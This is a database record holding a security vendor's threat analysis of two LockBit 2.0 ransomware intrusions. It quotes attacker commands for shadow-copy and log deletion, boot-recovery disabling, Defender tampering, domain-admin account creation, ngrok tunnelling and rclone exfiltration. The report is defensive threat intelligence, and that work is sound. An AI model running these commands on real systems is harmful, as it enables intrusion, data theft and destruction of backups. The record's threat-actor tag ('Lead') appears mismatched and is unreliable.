{
    "id": "08fecb21-f948-4f01-9133-7deb58435948",
    "created_at": "2023-01-12T15:05:19.356193Z",
    "updated_at": "2025-03-27T02:16:17.271589Z",
    "deleted_at": null,
    "sha1_hash": "a1f88be4ccef59b74c108d1efcaf89f7ba6cda04",
    "title": "2022-07-07 - THREAT ANALYSIS REPORT- LockBit 2.0 - All Paths Lead to Ransom",
    "authors": "",
    "file_creation_date": "2022-07-18T18:09:55Z",
    "file_modification_date": "2022-07-18T18:09:55Z",
    "file_size": 8248117,
    "plain_text": "# THREAT ANALYSIS REPORT: LockBit 2.0 - All Paths Lead to Ransom\n\n**[cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom](https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom)**\n\nWritten By\nCybereason Global SOC Team\n\nJuly 7, 2022\n|\n16 minute read\n\nThe [Cybereason Global Security Operations Center (GSOC) Team issues Cybereason Threat Analysis Reports to inform on](https://www.cybereason.com/blog/authors/cybereason-global-soc-team)\nimpacting threats. The Threat Analysis Reports investigate these threats and provide practical recommendations for protecting\nagainst them.\n\n\n-----\n\n[In this Threat Analysis report, Cybereason GSOC team analysts have analyzed two different cases that involved LockBit](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool)\ninfections, occurring at two very different time periods. Following this introduction, we describe in detail the attack chain from\nthe initial infection to the ransomware deployment.\n\n## Key Points\n\n**Intensive data exfiltration: Cybereason observed LockBit stealing large amounts of information from its victims. The**\nthreat actors mostly used FTP and cloud file hosting solutions such as FileZilla, Rclone and MegaSync to exfiltrate the\ninformation.\n**Constantly evolving tools and techniques: LockBit operates on a** [RaaS (Ransomware as a Service) model. The](https://www.cybereason.com/blog/white-paper-inside-complex-ransomops-and-the-ransomware-economy)\naffiliates that use LockBit’s services conduct their attacks according to their preference and use different tools and\ntechniques to achieve their goal. As the attack progresses further along the kill chain, the activities from different cases\ntend to converge to similar activities.\n**EDR-aware mentality: The attackers are constantly evolving, and take into consideration that EDR tools are doing the**\nsame. Thus, the attackers are making detection, investigation, and prevention more complex by disabling EDR and\nother security products, while deleting the evidence to baffle forensics attempts.\n**Cybereason Managed Detection and Response (MDR): The Cybereason GSOC team has a zero-tolerance policy**\ntowards attacks involving LockBit and its affiliates, and categorizes such attacks as critical, high-severity incidents. The\n[Cybereason GSOC MDR Team issues a comprehensive report to customers when such an incident occurs. The report](https://www.cybereason.com/services/managed-detection-response-mdr)\nprovides an in-depth overview of the incident, which helps to understand the scope of the compromise and the impact on\nthe customer’s environment. These reports also provide attribution information whenever possible, as well as\nrecommendations for threat mitigation and isolation.\n**Detected and prevented: The** [Cybereason Defense Platform effectively detects and prevents infections from LockBit](https://www.cybereason.com/platform#graphic)\nand their affiliates.\n\n## Introduction\n\nIn September 2019, a new version of a worm-like ransomware was reported. This ransomware was known as LockBit. Since\n[then, a new variant of LockBit was discovered, dubbed–LockBit 2.0.](https://www.cybereason.com/blog/research/cybereason-vs.-lockbit2.0-ransomware)\n\nLockBit 2.0 is very efficient and can spread quickly within a target network. It also operates in a RaaS (Ransomware-as-aservice) model, which has become an increasingly popular business model for ransomware operators in the past few years,\nhelping ransomware groups expand their reach and revenue while scaling up, without considerably growing their core team or\nexpenses.\n\nRaaS is a subscription-based model that enables affiliates to use existing ransomware tools and infrastructure in order to\nexecute ransomware attacks. LockBit 2.0 incentivizes affiliates to earn a percentage of each successful ransom payment by\nleveraging their tools to compromise entire networks and systems.\n\nSimilar to other ransomware, LockBit 2.0 uploads the compromised files to a public repository, where they are available to\neveryone on the internet:\n\n\n-----\n\n_LockBit 2.0 portal screenshot_\n\nWe have observed many different ransomware attacks which have increased massively over the past months. LockBit is one\nof the dominating ones, and in fact, is a highly sophisticated form of ransomware (see also: White Paper - Inside Complex\n_RansomOps and the Ransomware Economy). Current potential LockBit 2.0 victims’ business sectors range from IT services,_\nto financial institutions, to other large organizations.\n\nAfter the attackers have cleared their footstep by tampering with Windows security features to eliminate the possibility of\nrecovering the encrypted data by deleting backups and restoring features, the attackers proceed to encrypt the files on the\naffected machines.\nAfter the encryption, the user receives a ransom note informing them about the encryption of the files and provides\ninstructions on how to decrypt them by paying the ransom:\n\n_Post encryption ransom note as observed in one case study_\n\nThe high demand for LockBit’s services and its effective affiliate program makes it a growing threat that should not be\noverlooked.\n\nCybereason successfully detects LockBit’s operation and is able to facilitate the scoping of the threat, its magnitude and\nspread, and thus helps impacted organizations to act on time and stop the attack from infecting more systems and crucial\nassets.\n\n## Analysis\n\n### Attack Life Cycle: Case Study 1\n\n\n-----\n\n_Attack diagram as observed in this case study_\n\nThis case study describes how LockBit affiliates penetrated a network in Q4 2021 and worked their way through it to encrypt\nthe assets of the victim, a company in the industrial sector.\n\n**Infection Vector**\n\nThe affiliates working with LockBit are using their own malware and tools to launch the actual attacks on their targets. In most\nof the infections that we have encountered, the infection vector that led to the delivery of LockBit was a misconfigured service,\nparticularly a publicly opened RDP port.\n\nIn other cases, affiliates would use a more traditional phishing email that will allow them to remotely connect to a network via\nan employee’s computer, or utilize malicious attachments, downloads, application patch exploits or vulnerabilities to gain\naccess to a network.\n\n**Credentials Access and Reconnaissance**\n\nOnce the attacker established an initial foothold on the compromised network (machine), their next step was to start the\nreconnaissance activity and credentials extraction.\n\nIn this case, the attackers used tools such as Mimikatz and Netscan, a powerful network monitoring system that is used to\nidentify the network’s structure and valuable assets on the network. Both of these tools were used to assist lateral movement\nthroughout the network:\n\n\n-----\n\n_The use of Mimikatz and Netscan as seen in the Cybereason Defense Platform_\n\nAs can be seen in the image below, the attacker also used taskmgr.exe (Windows Task Manager) to create a memory dump of\nlsass.exe (Microsoft Local Security Authority Subsystem Service) to extract the user’s credentials:\n\n_Dumping lsass.exe process memory as seen in the Cybereason Defense Platform_\n\n**Vulnerabilities Exploitation**\n\nTo achieve more stealth and gain elevated privileges, the attackers also attempted to exploit the SpoolFool vulnerability (CVE2022-21999), which was first reported in February 2022. This vulnerability allows an unprivileged user to create arbitrary and\nwritable directories by configuring the SpoolDirectory attribute on a printer.\n\nSince an unprivileged user is allowed to add remote printers, an attacker can create a remote printer and grant everyone the\nright to manage this printer. Eventually, this is further used to perform tasks such as injecting malicious modules:\n\n\n-----\n\n_Exploitation of the SpoolFool vulnerability as seen in the Cybereason Defense Platform_\n\n**Lateral Movement and Remote Code Execution**\n\nThe attacker used PsExec to execute commands and other malicious executables and files on different machines on the\nnetwork.\n\nPsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials. It’s similar to a\nremote access program but instead of controlling the computer with a mouse, commands are sent via the Command Prompt.\n\nPsExec may be used by the attacker not only to manage processes on the remote computer, but also to redirect an\napplication’s console output to his computer, making it appear as though the process is running locally.\n\n**Defense Evasion**\n\nImpairing Defenses\n\nAs can be seen in the image below, the attacker used PsExec to remotely execute files and tools on the affected machines,\nsuch as :\n\n_C:\\WINDOWS\\system32\\cmd.exe /c \"1.cmd\"_\n\n_C:\\WINDOWS\\system32\\cmd.exe /c \"rdp.bat\"_\n\nThese commands were used to enable RDP connections and tamper with the Windows Defender settings. These actions\nwere taken in order to allow the attacker to remotely connect to the machines via compromised credentials and view, transfer\nor manipulate every file on the user’s system.\n\nTo enable RDP connections, the attackers used the aforementioned scripts which changed the registry value of the following\nto zero which specifies that Remote Desktop connections are enabled:\n\n_HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections_\n\nThe attackers have also used a Netsh command for adding a rule to the Windows Firewall exceptions list, allowing the use of\nRDP on local port (3389):\n\n_netsh advfirewall firewall add rule name=”allow RemoteDesktop” dir=in protocol=TCP localport=3389 action=allow_\n\nIn addition, as part of the executed scripts activity, PowerShell was observed executing the command “-Command Add_MpPreference -ExclusionPath *C:\\\\” which altered the Windows Defender settings by adding every file located under the (C:)_\ndirectory to the Windows Defender exclusion list, meaning every file that is located under this directory will not be monitored\nby Windows Defender.\n\nThat gave the attackers a “free hand” to operate and execute every file they desired with no interference or prevention:\n\n\n-----\n\n_1.cmd enabling RDP connections and tampering with Windows security as seen in the Cybereason Defense Platform_\n\nFor the attack to execute effectively, attackers conduct preliminary actions. Once executed, LockBit deletes important records,\nbackups, and data from the infected host in order to prevent forensics and recovery attempts of the encrypted data:\n\n_rdp.bat enabling RDP connections and tampering with Windows security as seen in the Cybereason Defense Platform_\n\nSubverting Recovery Methods\n\nThe attacker used wevtutil, a Windows legacy tool which enables retrieving information about event logs. The commands in\nthe image below were used by the attackers to clear logs that contain records of login/logout activities or other security-related\nevents specified by the system’s audit policy and applications.\n\nThe attackers executed this program in order to hide their tracks to avoid future forensics on the host:\n\n_Using wevtutil to clear security logs as seen in the Cybereason Defense Platform_\n\n\n-----\n\nAnother method we have spotted of deleting footprints by the attacker was using the ping command as a delay mechanism,\nallowing the ransomware process to terminate. Then the File System utility (Fsutil.exe) is used to prevent the malicious\nexecutable from being recovered by overwriting the first 524KB with zeros:\n\n_fsutil file setZeroData offset=0 length=524288 [Lockbit binary file path]_\n\n_Using fsutil.exe and ping to delete footprints_ _as seen in the Cybereason Defense Platform_\n\nBesides the use of wevtutil, the attackers also destroyed recovery methods with the help of the tools bcdedit.exe, wmic.exe,\nand vssadmin.exe.\n\nBCDEdit is a command-line tool for managing the Boot Configuration Data. In this case, BCDEdit was used to ensure that\nsystem boot failures are ignored and the recovery boot option disabled. This is also a method to make it harder for the user to\nretrieve their data:\n\n_Using wevtutil.exe and bcdedit.exe to prevent recovery as seen in the Cybereason Defense Platform_\n\nThe Volume Shadow Copy Service is an administrative tool that provides the framework for doing volume backups and for\ncreating consistent, point-in-time copies of data (known as shadow copies).\n\nThe attacker used both vssadmin.exe and Windows Management Instrumentation utility (wmic.exe) to delete the system’s\nshadow copies, and in doing so, making it impossible for the user to restore to the latest restore point or use any of the\nbackups:\n\n\n-----\n\n_Using vssadmin.exe and wmic.exe to delete shadow copies as seen in the Cybereason Defense Platform_\n\nDeactivation of AV/EDR\n\nAs part of the attack, the attackers used legitimate tools such as a small portable freeware called “Defender Control” which is\nused to disable Windows Defender in Windows 10 on some of the affected systems.\n\nThis is an easy yet effective method to disable Windows native security features:\n\n_Using “Defender Control” to disable Windows Defender_ _as seen in the Cybereason Defense Platform_\n\n### Attack Life Cycle: Case Study 2\n\n\n-----\n\n_Attack diagram as observed in this case study_\n\nThis case study describes how LockBit affiliates penetrated a network in Q2 2022 and worked their way through to encrypt the\nassets of the victim, a company in the retail industry.\n\n**Lateral Movement**\n\nThe first activity captured in this case study involves the PsExec utility by SysInternals. The threat actor laterally moved from\n“patient zero” to another server through the PsExec tool:\n\n_Psexesvc.exe spawning children process controlled by the attacker as seen in the Cybereason Defense Platform_\n\nThis allowed the threat actors to progress their intrusion by infecting more machines. Through the attack chain, the threat\nactors continuously leveraged PsExec.exe and mstsc.exe to pivot from one server to others using the following command:\n\n_Psexec \\\\[IP of the server] -s cmd.exe_\n\n\n-----\n\n_Mstsc.exe and PsExec.exe launched directly_\n\n_from a machine with visibility as seen in the Cybereason Defense Platform_\n\n**Persistence**\n\nAccount Creation\n\nThe threat actors used net.exe to create a domain account and elevate its privileges to “domain administrator” through the\nfollowing commands :\n\n_C:\\Windows\\system32\\net1 user /domain [Created attacker username] /add_\n\n_C:\\Windows\\system32\\net1 user_\n\n_C:\\Windows\\system32\\net1 user /domain [Created attacker username] Numlock!123 /add_\n\n_C:\\Windows\\system32\\net1 group \"domain admins\" [Created attacker username] /add_\n\nThis implied that the attacker already had high privileges on the Active Directory domain of the victim:\n\n\n-----\n\n_Net.exe and net1.exe_\n\n_being leveraged to create a domain user and assign it to the “administrators” domain group_\n\nThe threat actor then used this account to persist and spread on the victim’s network.\n\nPersistent Network Tunnel\n\nThe threat actor launched the following commands on 11 machines (10 servers, 1 workstation):\n\n_lssas.exe tcp 3389 --log=stdout_\n\n_lssas.exe config add-authtoken 28hJ[...]KW27Jpi_\n\nThe binary named “lssas.exe” is masquerading as “lsass.exe” (Windows process in charge of handling authentication on the\nsystem) but is in fact the infamous tunneling tool, “Ngrok”:\n\n_Lssas.exe (in fact,_\n\n_Ngrok) deployed on one of the affected machine through PsExec as seen in the Cybereason Defense Platform_\n\nNgrok is a legitimate reverse proxy tool that is able to create a tunnel to servers located behind firewalls. It is also able to\ntunnel traffic to local machines that do not have a public IP. Ngrok has been utilized by threat actors in many campaigns and is\nknown to be famous specifically for lateral movement and data exfiltration functionalities.\n\nExecuting Ngrok gave the attackers the ability to access the network remotely, even if the initial infection vector is later\npatched or removed. The Cybereason GSOC team then observed RDP sessions initiated through this tunnel:\n\n\n-----\n\n_Remote interactive sessions executed through the Ngrok tool tunneling RDP traffic as seen in the Cybereason Defense_\n_Platform_\n\n**Credential Theft**\n\nThe threat actor then proceeded to steal further credentials on the network, in order to extend their access on the network. In\nthis case study, the threat actors interactively used the Windows executable taskmgr.exe to dump the memory of the process\nlsass.exe:\n\n\n-----\n\n_Lsass.exe process dumping through the_\n\n\n_taskmgr.exe executable as seen in the Cybereason Defense Platform_\n\n\n-----\n\nThe attackers then copied the memory dump file back onto the machine they controlled, using remote desktop (RDP) access\nand the tunnel created earlier. They then used tools such as “Mimikatz” to extract credentials from the dump file.\n\nA day later, as the attack progressed, the threat actors continued their credential collection activity by launching the Windows\nexecutable ntdsutil.exe on one of the domain controllers:\n\n_Ntdsutil.exe command-line tool_\n\n_executed on one of the domain controllers as seen in the Cybereason Defense Platform_\n\nThis granted the attackers access to all Active Directory accounts name and password hashes, enabling them to eventually\nattempt to recover the plaintext password.\n\n**Data Exfiltration**\n\nOnce the LockBit affiliate achieved persistent remote access and sufficient credentials, they proceeded to collect and exfiltrate\nthe data.\n\nThe actors used three different tools for that purpose :\n\nFilezilla.exe to connect to a remote FTP service controlled by the attacker\nRclone.exe to exfiltrate data to a “Mega”-related cloud hosting service\nMegasync.exe tool to exfiltrate data to a “Mega”-related cloud hosting service\n\nFirst, the threat actor installed and launched the filezilla.exe client using the following command lines :\n\n_C:\\Users\\[Username]\\Downloads\\FileZilla_3.59.0_win64_sponsored-setup.exe_\n_Filezilla.exe_\n\n\n-----\n\n_Highlight on the connections to one_\n\n_IP address in particular, 185.81.68.180, on random ports 50749, 54001, 59516 and 59705 as seen in the Cybereason_\n_Defense Platform_\n\nThe Cybereason GSOC team observed the exfiltration activity related to “Filezilla” on six servers. After this exfiltration method\nwas used, the threat actor leveraged Rclone.exe to again, exfiltrate data using the following commands:\n\n_rclone config_\n\n_rclone copy \"[HR data folder path]\" [remote path]:[remote path]_\n\nThis activity is captured below. One can observe that the executable is launched through PsExec and represents unusually\nhigh network traffic:\n\n\n-----\n\n_Rclone.exe leveraged to exfiltrate data to mega.co.nz as seen in the Cybereason Defense Platform_\n\nFinally, the threat actor used a third tool to exfiltrate data to Mega[.]co[.]nz cloud hosting servers. The tool used for this is\ncalled Megasync.exe. The attackers ran the following commands to exfiltrate the data:\n\n_C:\\Users\\[Username]\\Downloads\\MEGAsyncSetup64.exe_\n\n_C:\\Users\\[Username]\\AppData\\Local\\MEGAsync\\MEGAsync.exe_\n\n_C:\\Users\\[Username]\\AppData\\Local\\MEGAsync\\MEGAsync.exe /uninstall_\n\nThe Cybereason GSOC team only observed the exfiltration activity related to Mega on the company main file server.\n\n**Network Discovery**\n\nAt this point, the threat actor presented on the network for a while and had access to multiple servers and workstations. In\norder to progress to its next and final phase, data encryption, the attacker needed a list of all the assets of the victim. The\nactor leveraged the “Advanced IP Scanner” tool in order to identify as many machines as possible.\n\nThis tool is meant to actively discover hosts and their hosted services. The attacker launched it from two different servers that\nare considered as “pivoting” machines for the actor:\n\n\n-----\n\n_Advanced IP scanner creating network connections and spawning remote desktop process (mstsc.exe) as seen in the_\n_Cybereason Defense Platform_\n\nThe actor also used the provided remote desktop client feature to spawn child mstsc.exe processes that are meant to connect\nthrough the remote desktop service or RDP. We have observed a very high number of connections to internal IP addresses.\n\nApproximately at the same time, the actor also infected 15 additional machines with the malware “Neshta”. Neshta is a file\ninfector which injects its malicious code to targeted executable files:\n\n\n-----\n\n_Neshta was injected_\n\n_into many executables, also spawning the “svchost.com” process as a result, which spawns the legitimate executable again_\n_as a child process as seen in the Cybereason Defense Platform_\n\nAs previously mentioned in the community, some LockBit and other ransomware and attacks (REvil/Sodinokibi, for instance)\nare found to be concurrent with present Neshta infections on the same environment.\n\nWe did not find evidence that demonstrates the specific use of Neshta by the attackers, and hence we strongly believe that\nthe tools the attackers used were pre-infected with Neshta:\n\n\n-----\n\n_Source :_ _[https://twitter.com/AltShiftPrtScn/status/1519265746630717440](https://twitter.com/AltShiftPrtScn/status/1519265746630717440)_\n\nAt this point, the LockBit affiliate had completed all the necessary steps to execute the LockBit payload and commence\nencryption:\n\nPersistence on the network through multiple infected machines\nAccess to top-privilege accounts\nCollected and exfiltrated victim data\nList of most assets through network discovery and scans\n\n### Defense Evasion and Impact Phases\n\nThis section describes the “Defense Evasion” and “Impact” phases (according to the MITRE ATT&CK Tactic classification).\n\nApproximately four hours before the global deployment of the LockBit ransomware, the attacker bypassed existing security\nfeatures and also deleted evidence in order to complicate investigation and forensics attempts.\n\n**Security Products Deactivation Attempts**\n\nFirst, the threat actor attempted to disable the Cybereason sensors, directly from the impacted machine. For that purpose,\nthey used the two following commands :\n\n_CrDrvCtrl disable test, which attempts to disable the driver installed by the EDR_\n_Wmic product where name=”Cybereason Sensor” call uninstall /noninteractive, which attempts to uninstall the sensor on_\nthe machine\n\n\n-----\n\n_Threat actor attempting to disable Cybereason’s sensor as seen in the Cybereason Defense Platform. This attempt failed._\n\n_Threat actor attempting to uninstall Cybereason’s sensor as seen in the Cybereason Defense Platform. This attempt failed._\n\nBoth attempts failed in the context of the victim. The threat actor then attempted to disable EPP/AV products on the different\nmachines. Bitdefender was first targeted through the attempt to disable BitDefender mini-filter with the command:\n\n_“fltmc” unload gzflt_\n\n_Threat actor_\n\n_disabling BitDefender mini-filter as seen in the Cybereason Defense Platform_\n\nA few minutes before it launched the ransomware, the attacker also launched “defendercontrol.exe” on 14 servers. As stated\nin the previous case study, Defender Control is used to disable Microsoft Defender:\n\n\n-----\n\n_Launching of “defendercontrol.exe” as seen in the Cybereason Defense Platform_\n\nIn addition to the use of “defendercontrol.exe”, the attacker launched the following commands, that were started from a\nservice created by the attacker, named “TrustedInstaller”:\n\n_“PowerShell -nop -win 1 -c & {$AveYo=' A LIMITED ACCOUNT PROTECTS YOU FROM UAC EXPLOITS_\n_';$env:1=6;$k=@();$k+=gp Registry::HKEY_Users\\S-1-5-21*\\Volatile* ToggleDefender -ea 0;iex($k[0].ToggleDefender)}”_\n\n_MpCmdRun.exe -DisableService_\n\n_Net1.exe stop windefend - D_\n\n_sc.exe config windefend depend=RpcSs-TOGGLE_\n\n\n-----\n\n_Threat Actor launching a PowerShell one-liner command to disable EPP/Antivirus products as seen in the Cybereason_\n_Defense Platform_\n\nIn order to execute all the activities related to “Defense Evasion”, the actor used a batch script to automate the execution:\n\n\n-----\n\n_Batch scripts launched remotely on the targeted_\n\n_machines_\n\n**Ransomware Deployment**\n\nThe threat actor launched the Lockbit ransomware executable. The threat actor used three different methods for this purpose\n:\n\nManual deployment through RDP\nSemi-automated deployment with “PsExec” through the ransomware binary itself\nCreation of a dedicated GPO (Group Policy Object) on the main Active Directory forest\n\nThe GPO created scheduled tasks that :\n\nAttempted to kill security-related and backup-related products’ processes\nStopped many application-related services (for instance, SQL engine services)\nLaunched the Lockbit ransomware executable\n\n\n-----\n\n_Extract from the GPO_\n\n_created by the attacker_\n\nThe ransomware executed on the victim machines was “Lockbit 2.0”. It was configured to automatically spread on all\nconfigured targets and thus created internal network connections:\n\n\n-----\n\n_Lockbit ransomware deployment and activity as seen in the Cybereason Defense Platform_\n\nIt also spawned multiple child processes including:\n\n_\"C:\\Windows\\SysWOW64\\mshta.exe\"_\n\n_\"C:\\Users\\TEMP\\Desktop\\LockBit_Ransomware.hta\" [GUID]_\n\n**Preparing the Machines for Encryption**\n\nThe Lockbit ransomware launched cmd.exe which created different child processes in order to prepare the machine for\nencryption. The following commands were issued by the executable:\n\n_vssadmin delete shadows /all /quiet_\n\n_bcdedit /set {default} recoveryenabled No_\n\n_wmic SHADOWCOPY /nointeractive_\n\n_ping 127.0.0.7 -n 3_\n_fsutil file setZeroData offset=0 length=524288 \"C:\\Windows\\LockBit_[Random number].exe\"_\n\n\n-----\n\n_for encryption with backup deletion and machine performance modification as seen in the Cybereason Defense Platform_\n\nThis activity is exactly the same as the one documented in the first case study. You can refer to the first case study for more\ninformation.\n\n**Log Deletion**\n\nThe system events deletion phase happened approximately at the same time as the launch of the ransomware.\n\n\n-----\n\nSimilar to the activity documented in the first case study, this shows an enhancement compared to the first case study log\ndeletion attempts, as many event sources are targeted, instead of just deleting “security”, “system” and “application” Windows\nevents:\n\n_Listing of wevtutil.exe commands launched by the attacker_\n\nThe command “Wevtutil CL [Event source]” is used to clear local Windows event logs.\n\n### A Glance Into the IOCs\n\nThe infrastructure in use by the attacker that was identified in the second case study is heterogenous, depending on the tool\nused:\n\nFor persistence and exfiltration activities, the attacker leveraged cloud servers. For instance, subdomains from\n“userstorage.mega.co.nz” or “ngrok.io” (rclone.exe tool, megasync.exe tool, ngrok tool)\nFor another exfiltration tool, Filezilla, which is an FTP client, the context is different: an IP address stood out,\n185.81.68[.]180, located in Russia\n\nThe Cybereason GSOC team analyzed the infrastructure related to this IP address and identified the following key points:\n\nThe IP address is not detected in VirusTotal\nThe service provider is located in Russia\nThe ISP company, based in Cyprus, is named Starcrecium, associated in the past with other malicious actors\nMany network services observed on the IP address, including remote desktop, HTTP, FTP, WinRM\n\n\n-----\n\nTLS certificate associated with the RDP service is signed for WIN LIVFRVQFMKO, which is a common name for a\nmachine, also associated with other malicious activities\n\n_IP address 185.81.68[.]180 - Service analysis_\n\n\n-----\n\n_IP address 185.81.68[.]180 - Hosting Company analysis_\n\n**Link Repository**\n\nVirusTotal - Link #1 - [https://www.virustotal.com/gui/ip-address/193.27.228.247/detection](https://www.virustotal.com/gui/ip-address/193.27.228.247/detection)\nActive VPN Reconnaissance - Link #2 - https://www.securityondemand.com/active-vpn-reconnaissance-campaign-fromrussia-based-ip/\nLOREC53 activity - Link #3 - https://nsfocusglobal.com/apt-retrospection-lorec53-an-active-russian-hack-grouplaunched-phishing-attacks-against-georgian-government/\nAbuseIPDB - Link #4 - [https://www.abuseipdb.com/check/45.135.232.93?page=4](https://www.abuseipdb.com/check/45.135.232.93?page=4)\n[AlienVault pulse - Link #5 - https://otx.alienvault.com/pulse/61348def9b7e45731d8bef82](https://otx.alienvault.com/pulse/61348def9b7e45731d8bef82)\n\n## Detection and Prevention\n\n### Cybereason Defense Platform\n\n\n-----\n\nThe [Cybereason Defense Platform is able to detect and prevent infections with LockBit using multi layer protection that](https://www.cybereason.com/platform)\ndetects and blocks malware with threat intelligence, machine learning, and Next-Gen Antivirus (NGAV) capabilities:\n\n_The Cybereason Defense Platform creates a MalOp out of the execution of the LockBit binary_\n\n_The Cybereason Defense Platform identifies the malicious code injection and executable_\n\n## Cybereason GSOC MDR\n\nThe Cybereason GSOC recommends the following:\n\n[Enable the Anti-Malware feature on the Cybereason NGAV and enable the Detect and Prevent modes of this feature.](https://nest.cybereason.com/documentation/product-documentation/190/anti-malware-settings)\nEnable the Anti-Ransomware feature on the Cybereason NGAV and enable the Detect and Prevent modes of this\nfeature.\nSecurely handle files downloaded from the Internet and email messages that originate from external sources.\nThreat Hunting with Cybereason: The Cybereason MDR team provides its customers with custom hunting queries for\n[detecting specific threats - to find out more about threat hunting and Managed Detection and Response with the](https://www.cybereason.com/platform/managed-detection-response-mdr)\n[Cybereason Defense Platform, contact a Cybereason Defender here.](https://www.cybereason.com/services/managed-detection-response-mdr#form)\n\n[For Cybereason customers: More details available on the NEST including custom threat hunting queries for](https://nest.cybereason.com/knowledgebase/5782001)\ndetecting this threat.\n\nCybereason is dedicated to teaming with defenders to end cyber attacks from endpoints to the enterprise to everywhere.\n[Schedule a demo today to learn how your organization can benefit from an operation-centric approach to security.](https://www.cybereason.com/request-a-demo)\n\n## Indicators of Compromise\n\n\n-----\n\n**Executables** SHA-256 hash: Neshta - svchost.com\n\n_b462d28ae1f49b389d1df0213eafc75daf2ce681db989a363348d7f19379c02b_\n\nSHA-1 hash:\n\n_db6e1a1dbb0e351c44b49db79b8bad3321d673a1_\n\nSHA-256 hash: DefenderControl.exe\n\n_ce162d2d3649a13a48510e79ef0046f9a194f9609c5ee0ee340766abe1d1b565_\n\n**IP addresses** _185.81.68.180_\n\n## MITRE MAPPING\n\nThe table below summarizes the activities that are most prevalent across all infections with LockBit that the Cybereason MDR\nteam has observed:\n\n\n**Initial**\n**Access**\n\nExternal\n[Remote](https://attack.mitre.org/techniques/T1133/)\nServices\n\nPublicly\nopen\nRDP\naccess\n\n\n**Credential**\n**Access**\n\nOS Credential\nDumping:\nLSASS\nMemory\n\nUsage of\nTaskMgr.exe\n\nOS Credential\n[Dumping:](https://attack.mitre.org/techniques/T1003/003/)\nNTDS\n\nNtdsutil.exe\n\n\n**Privilege**\n**Escalation**\n\nExploitation\n[for Privilege](https://attack.mitre.org/techniques/T1068/)\nEscalation\n\nSpoolFool\nvulnerability\n\n\n**Lateral**\n**Movement**\n\nRemote\nServices:\n[Remote](https://attack.mitre.org/techniques/T1021/001/)\nDesktop\nProtocol\n\nMstsc.exe\nleveraged to\nmove\nbetween\nassets\n\nNetwork\n[Service](https://attack.mitre.org/techniques/T1046/)\nDiscovery\n\nAdvanced\nIP Scanner\n\nRemote\nServices:\nSMB/Windows\nAdmin Shares\n\nPsExec\nfrom\nSysInternals\n\n\n**Persistence** **Exfiltration** **Defense**\n**Evasion**\n\n\nProtocol\nTunneling\n\nNgrok and\nRDP traffic\ntunneling\n\nAccount\nManipulation\n\nDomain\naccount\ncreation and\naddition to\nadministrators\ngroup\n\nScheduled\n[Task/Job:](https://attack.mitre.org/techniques/T1053/)\nScheduled Task\n\nLockbit 2.0\ndeployment\nthrough\nremote\nscheduled\ntask creation\n\n\nExfiltration\nOver Web\nService:\nExfiltration\nto Cloud\nStorage\n\nFilezilla\n\nMegaSync\n\nRClone\n\n\nImpair\nDefenses:\nDisable or\nModify Tools\n\nBitdefender\nmini-filter\n\nCybereason\nservice\ndeactivation\nattempt\n\nIndicator\nRemoval on\n[Host: Clear](https://attack.mitre.org/techniques/T1070/001/)\nWindows\nEvent Logs\n\nWevtutil CL\nusage\n\nImpair\nDefenses:\n[Disable](https://attack.mitre.org/techniques/T1562/002/)\nWindows\nEvent Logging\n\nFsutil.exe\nand\nwevtutil.exe\n\n\n**Impact**\n\nData\n[Encrypted](https://attack.mitre.org/techniques/T1486/)\nfor Impact\n\nLockbit\n2.0\nencryption\n\nInhibit\n[System](https://attack.mitre.org/techniques/T1490/)\nRecovery\n\nBcdedit,\nvssadmin\n\n\n-----\n\nBoot or Logon\nInitialization\nScripts: Network\nLogon Script\n\nGPO creation\nto create\nscheduled\ntask\ndeploying\nLockbit\n\n## About the Researchers\n\n**Loïc Castel, Principal Security Analyst, Cybereason Global SOC**\n\nLoïc Castel is a Senior Security Analyst with the Cybereason Global SOC team. Loïc analyses and researches critical incidents and\ncybercriminals, in order to better detect compromises. In his career, Loïc worked as a security auditor in well-known organizations such as\nANSSI (French National Agency for the Security of Information Systems) and as Lead Digital Forensics & Incident Response at Atos. Loïc loves\ndigital forensics and incident response, but is also interested in offensive aspects such as vulnerability research.\n\n**Gal Romano, Senior Security Analyst, Cybereason Global SOC**\n\nGal Romano is a Senior Security Analyst with the Cybereason Global SOC (GSOC) team. He is involved in malware analysis, mobile malware\nanalysis, and threat hunting activities. Gal was involved in several milestone projects in Cybereason, such as the SOC Extended Detection and\nResponse (XDR) initiative, and the Linux hunting team.\n\n\n-----\n\nAbout the Author\n\n**Cybereason Global SOC Team**\n\nThe Cybereason Global SOC Team delivers 24/7 Managed Detection and Response services to customers on every\ncontinent. Led by cybersecurity experts with experience working for government, the military and multiple industry verticals,\nthe Cybereason Global SOC Team continuously hunts for the most sophisticated and pervasive threats to support our mission\nto end cyberattacks on the endpoint, across the enterprise, and everywhere the battle moves.\n\n[All Posts by Cybereason Global SOC Team](https://www.cybereason.com/blog/authors/cybereason-global-soc-team)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-07 - THREAT ANALYSIS REPORT- LockBit 2.0 - All Paths Lead to Ransom.pdf"
    ],
    "report_names": [
        "2022-07-07 - THREAT ANALYSIS REPORT- LockBit 2.0 - All Paths Lead to Ransom.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c28760b2-5ec6-42ad-852f-be00372a7ce4",
            "created_at": "2022-10-27T08:27:13.172734Z",
